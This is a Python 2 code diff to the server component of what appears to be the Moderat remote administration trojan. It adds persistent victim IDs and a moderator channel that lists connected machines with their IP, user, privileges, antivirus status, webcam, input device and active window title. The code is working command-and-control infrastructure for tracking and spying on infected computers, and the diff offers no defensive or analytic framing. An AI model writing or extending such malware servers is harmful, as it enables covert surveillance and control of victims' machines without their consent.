@@ -4,11 +4,17 @@ import threading
 import zlib
 import ast
 import time
+import random
+import string
 from modechat import *
 
 CLIENT_PORT = 4434
 MODERATOR_PORT = 1313
 MAX_CONNECTIONS = 6400
+
+
+def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
+    return ''.join(random.choice(chars) for _ in range(size))
 
 
 class ModeratServer:
@@ -19,7 +25,11 @@ class ModeratServer:
         self.accept_thread_state = False
         # client sockets bank
         self.streaming_socks = {}
+        self.shared_socks = {}
         self.socks = {}
+
+        # moderators
+        self.moderator_threads = {}
 
     def start_listen_for_clients(self):
         clients_thread = threading.Thread(target=self.client_listen_start)
@@ -73,6 +83,16 @@ class ModeratServer:
                     self.socks[socket_index]['inputdevice'] = info['inputdevice']
                     self.socks[socket_index]['webcamdevice'] = info['webcamdevice']
                     self.socks[socket_index]['activewindowtitle'] = info['activewindowtitle']
+
+
+                    if info['keypassword'] != '':
+                        keypassword = info['keypassword']
+                        self.socks[socket_index]['id'] = keypassword
+                        print '[+] Get ID (%s)' % keypassword
+                    else:
+                        new_id = id_generator()
+                        print '[+] Generating New ID (%s)' % new_id
+                        send(self.sock, 'setKeyPassword %s' % new_id)
 
                     get(self.sock, 'startChildSocket %s' % socket_index, 'streamingMode')
 
@@ -144,6 +164,61 @@ class ModeratServer:
 
             if self.moderator_sock:
                 print '[+] New Moderator Connected (%s(%s))' % (self.moderator_address[0], self.moderator_address[1])
+                self.moderator_threads[self.moderator_address[1]] = threading.Thread(target=self.moderator_listener, args=(self.moderator_sock, self.moderator_address[1]))
+                self.moderator_threads[self.moderator_address[1]].start()
+
+    def Receive(self, sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
+        received_data = ""
+        l = sock.recv(1024)
+        while l:
+            received_data = received_data + l
+            if received_data.endswith(end):
+                break
+            else:
+                l = sock.recv(1024)
+        if received_data.count(splitter):
+            _type, message = received_data.split(splitter)
+            return _type, message[:-len(end)].decode('utf-8')
+        else:
+            return 'info', ''
+
+    def Send(self, sock, _data, mode, splitter='%:::%', end="[ENDOFMESSAGE]"):
+        msg = (_data + end).encode('utf-8')
+        size = len(msg)
+        msg = mode + splitter + msg
+        sock.sendall(str(size) + '%:::%' + msg)
+
+    def moderator_listener(self, sock, socket_id):
+        while 1:
+            try:
+                data, mode = self.Receive(sock)
+                if data == 'getClients':
+                    print 'send Get Clients'
+                    output = self.command_get_clients()
+                else:
+                    output = 'No Output'
+                self.Send(sock, output, mode)
+            except socket.error:
+                print 'Socket Error'
+                return
+            time.sleep(3)
+
+
+    # Moderator Commands
+    def command_get_clients(self):
+        for i, k in self.socks.iteritems():
+            self.shared_socks[i] = {}
+            self.shared_socks[i]['ip_address'] = self.socks[i]['ip_address']
+            self.shared_socks[i]['socket'] = self.socks[i]['socket']
+            self.shared_socks[i]['ostype'] = self.socks[i]['ostype']
+            self.shared_socks[i]['protection'] = self.streaming_socks[i]['protection']
+            self.shared_socks[i]['os'] = self.socks[i]['os']
+            self.shared_socks[i]['user'] = self.socks[i]['user']
+            self.shared_socks[i]['privileges'] = self.streaming_socks[i]['privileges']
+            self.shared_socks[i]['inputdevice'] = self.socks[i]['inputdevice']
+            self.shared_socks[i]['webcamdevice'] = self.socks[i]['webcamdevice']
+            self.shared_socks[i]['activewindowtitle'] = self.streaming_socks[i]['activewindowtitle']
+        return str(self.shared_socks)
 
 
 
